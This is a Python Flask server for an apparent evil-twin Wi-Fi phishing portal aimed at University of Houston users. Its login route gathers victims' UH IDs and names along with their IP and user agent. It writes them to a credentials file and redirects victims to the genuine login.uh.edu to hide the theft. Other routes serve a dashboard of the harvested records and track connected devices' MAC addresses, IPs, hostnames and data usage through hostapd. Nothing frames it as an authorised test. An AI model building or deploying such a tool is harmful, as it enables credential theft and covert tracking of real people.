from flask import Flask, request, redirect, render_template, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime
import requests
import os
import ast
import subprocess
import re
import time
import json
from threading import Lock
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('werkzeug')
logger.setLevel(logging.ERROR)  # Disable Flask's default logging

app = Flask(__name__, static_folder='static')  # Set the static folder explicitly
CORS(app)  # Enable CORS for development

# Global variables for connection tracking
HOSTAPD_LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs', 'hostapd.log')
CONNECTIONS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs', 'connections.json')
connections_lock = Lock()

# Initialize or clear log files on startup
def init_log_files():
    # Create logs directory if it doesn't exist
    log_dir = os.path.dirname(HOSTAPD_LOG)
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    # Clear hostapd log
    with open(HOSTAPD_LOG, 'w') as f:
        f.write('')
    os.chmod(HOSTAPD_LOG, 0o666)  # Make writable by all users
    
    # Initialize connections file with empty list
    with open(CONNECTIONS_FILE, 'w') as f:
        json.dump([], f)
    os.chmod(CONNECTIONS_FILE, 0o666)  # Make writable by all users

# Initialize files on startup
init_log_files()

# Global dictionary to track connected clients
connected_clients = {}

# Ensure creds directory exists
if not os.path.exists('creds'):
    os.makedirs('creds')
    with open('creds/credentials.txt', 'a') as f:
        pass  # Create empty file

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = {
            'timestamp': datetime.now().isoformat(),
            'uh_id': request.form.get('uid'),
            'first_name': request.form.get('fname'),
            'last_name': request.form.get('lname'),
            'ip': request.remote_addr,
            'ua': request.headers.get('User-Agent')
        }

        # Save to file
        try:
            with open("creds/credentials.txt", "a") as f:
                f.write(f"{data}\n")
        except Exception as e:
            print(f"Error writing to credentials file: {e}")

        return redirect("https://login.uh.edu")

    try:
        return render_template("login.html")
    except Exception as e:
        print(f"Error rendering login template: {e}")
        return str(e), 500

@app.route('/dashboard')
def dashboard():
    try:
        if os.path.exists('frontend/build'):
            return send_from_directory('frontend/build', 'index.html')
        return render_template("dashboard.html")
    except Exception as e:
        print(f"Error serving dashboard: {e}")
        return str(e), 500

@app.route('/api/creds')
def creds_api():
    entries = []
    creds_file = "creds/credentials.txt"
    if os.path.exists(creds_file):
        try:
            with open(creds_file, "r") as f:
                for line in f:
                    try:
                        entry = ast.literal_eval(line.strip())
                        entries.append(entry)
                    except Exception as e:
                        print(f"Error parsing line: {e}")
                        continue
        except Exception as e:
            print(f"Error reading credentials file: {e}")
    return jsonify(entries)

def update_connection_status(log_entry):
    with connections_lock:
        try:
            # Read current connections
            with open(CONNECTIONS_FILE, 'r') as f:
                connections = json.load(f)
            
            # Extract MAC address from log entry
            mac_match = re.search(r'([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})', log_entry)
            if not mac_match:
                return
            
            mac = mac_match.group(1).lower()
            current_time = int(time.time())
            
            # Check for connection (AUTH, ASSOC, AUTHORIZED)
            if '[AUTH][ASSOC][AUTHORIZED]' in log_entry:
                # Get IP and hostname from DHCP leases
                ip = 'Unknown'
                hostname = 'Unknown'
                if os.path.exists('/var/lib/misc/dnsmasq.leases'):
                    with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                        for line in f:
                            parts = line.strip().split()
                            if len(parts) >= 4 and parts[1].lower() == mac:
                                ip = parts[2]
                                hostname = parts[3]
                                break
                
                # Add or update connection
                existing = next((c for c in connections if c['mac'] == mac), None)
                if existing:
                    existing.update({
                        'ip': ip,
                        'hostname': hostname,
                        'connected_since': current_time,
                        'status': 'Connected'
                    })
                else:
                    connections.append({
                        'mac': mac,
                        'ip': ip,
                        'hostname': hostname,
                        'connected_since': current_time,
                        'rx_mb': 0,
                        'tx_mb': 0,
                        'status': 'Connected'
                    })
            
            # Check for disconnection (DEAUTH)
            elif 'DEAUTH' in log_entry or 'timeout_next=DEAUTH' in log_entry:
                # Mark client as disconnected but keep the original connection time
                for conn in connections:
                    if conn['mac'] == mac:
                        conn['status'] = 'Disconnected'
                
                # Remove clients that have been disconnected for more than 24 hours
                connections = [
                    c for c in connections 
                    if not (c['status'] == 'Disconnected' and current_time - c['connected_since'] > 86400)
                ]
            
            # Update data transfer stats for connected clients
            for conn in connections:
                if conn['status'] == 'Connected':
                    try:
                        info = subprocess.check_output(['sudo', 'hostapd_cli', '-i', 'wlan0', 'sta', conn['mac']], stderr=subprocess.PIPE).decode()
                        for line in info.split('\n'):
                            if 'rx_bytes=' in line:
                                conn['rx_mb'] = round(int(line.split('=')[1]) / (1024 * 1024), 2)
                            elif 'tx_bytes=' in line:
                                conn['tx_mb'] = round(int(line.split('=')[1]) / (1024 * 1024), 2)
                    except subprocess.CalledProcessError:
                        pass
            
            # Save updated connections
            with open(CONNECTIONS_FILE, 'w') as f:
                json.dump(connections, f)
                
        except Exception as e:
            print(f"Error updating connections: {e}")

@app.route('/api/log', methods=['POST'])
def log_hostapd():
    try:
        log_entry = request.get_data(as_text=True)
        
        # Append to log file
        with open(HOSTAPD_LOG, 'a') as f:
            f.write(f"{datetime.now().isoformat()} {log_entry}\n")
        
        # Update connection status
        update_connection_status(log_entry)
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/connections')
def connections_api():
    try:
        with connections_lock:
            if os.path.exists(CONNECTIONS_FILE):
                with open(CONNECTIONS_FILE, 'r') as f:
                    connections = json.load(f)
                return jsonify(sorted(connections, key=lambda x: (x['status'] == 'Disconnected', -x['connected_since'])))
            return jsonify([])
    except Exception as e:
        return jsonify([])

# Event handlers for hostapd events
def handle_client_connect(mac):
    connected_clients[mac] = {
        'connected': True,
        'connect_time': time.time(),
        'duration': 'Just connected',
        'rx_mb': 0,
        'tx_mb': 0
    }
    print(f"[DEBUG] Updated client state for {mac}: {connected_clients[mac]}")

def handle_client_disconnect(mac):
    if mac in connected_clients:
        connected_clients[mac]['connected'] = False
        print(f"[DEBUG] Marked client {mac} as disconnected")

def update_client_durations():
    current_time = time.time()
    for mac, client in connected_clients.items():
        if client['connected']:
            duration = int(current_time - client['connect_time'])
            hours = duration // 3600
            minutes = (duration % 3600) // 60
            client['duration'] = f"{hours}h {minutes}m"

# Update durations periodically
@app.before_request
def before_request():
    update_client_durations()

# Event handler route for hostapd events
@app.route('/api/events', methods=['POST'])
def handle_event():
    try:
        event = request.json
        print(f"[DEBUG] Received event: {event}")
        
        if event['type'] == 'connect':
            handle_client_connect(event['mac'])
            print(f"[DEBUG] Client connected: {event['mac']}")
            
            # Get station info
            try:
                output = subprocess.check_output(['sudo', 'hostapd_cli', '-i', 'wlan0', 'sta', event['mac']], stderr=subprocess.PIPE)
                print(f"[DEBUG] Station info: {output.decode()}")
            except subprocess.CalledProcessError as e:
                print(f"[DEBUG] Error getting station info: {e}")
                
        elif event['type'] == 'disconnect':
            handle_client_disconnect(event['mac'])
            print(f"[DEBUG] Client disconnected: {event['mac']}")
            
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"[DEBUG] Error in handle_event: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Serve React static files
@app.route('/dashboard/static/js/<path:filename>')
@app.route('/dashboard/static/css/<path:filename>')
@app.route('/dashboard/static/media/<path:filename>')
def serve_react_static(filename):
    if filename.startswith('main.'):
        folder = 'js' if '/js/' in request.path else 'css'
        return send_from_directory(f'frontend/build/static/{folder}', filename)
    return send_from_directory('frontend/build/static/media', filename)

# Serve captive portal static files
@app.route('/static/<path:filename>')
def serve_portal_static(filename):
    return send_from_directory('static', filename)

# Serve other React assets
@app.route('/dashboard/manifest.json')
def serve_manifest():
    return send_from_directory('frontend/build', 'manifest.json')

@app.route('/dashboard/favicon.ico')
def serve_favicon():
    return send_from_directory('frontend/build', 'favicon.ico')

@app.route('/dashboard/logo192.png')
def serve_logo():
    return send_from_directory('frontend/build', 'logo192.png')

if __name__ == '__main__':
    print(f"Starting Flask server on port 443...")
    print(f"Templates directory: {os.path.abspath('templates')}")
    print(f"Static directory: {os.path.abspath('static')}")
    print(f"React build directory: {os.path.abspath('frontend/build')}")
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.crt', 'cert.key'), debug=False)
